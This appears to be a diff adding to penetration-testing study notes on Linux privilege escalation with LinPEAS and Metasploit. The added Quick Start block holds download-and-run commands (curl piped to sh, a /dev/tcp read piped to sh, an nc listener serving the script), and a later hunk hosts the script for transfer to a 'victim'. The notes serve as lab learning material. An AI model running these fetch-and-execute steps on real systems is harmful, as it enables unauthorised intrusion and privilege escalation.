@@ -1,3 +1,19 @@
+## Quick Start
+```bash
+#From github
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-script-suite/master/linPEAS/linpeas.sh | sh
+```
+
+```bash
+#Local network
+python -m SimpleHTTPServer 80
+curl 10.10.10.10/linpeas.sh | sh
+
+#Without curl
+nc -lvnp 80 < linpeas.sh
+cat < /dev/tcp/10.10.10.10/80 | sh
+```
+
 The two different ways to do this within Metasploit, you can run the search command to
 just called search and then you throw in the service and the version uh or on Cali directly 
 from the terminal called Search sploit
@@ -53,7 +69,8 @@ PRIV ESC ON VICTIM 2
 (ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh
 (ATTACKER) ls [this is a automation script that we will move to the victim] this info could be found on hacktricks
 (Checklist Linux Privesc escalation LinPEAS)
-(ATTACKER) cat linpeas.sh| less
+(ATTACKER) cat linpeas.sh| less (CHECK THEN EXIT)
+(ATTACKER) ls
 (ATTACKER) python3 -m http.server 8000 (THIS LETS YOU HOST A WEBSERVER WITH PYTHON)
 *there might be a hot key to start this
 
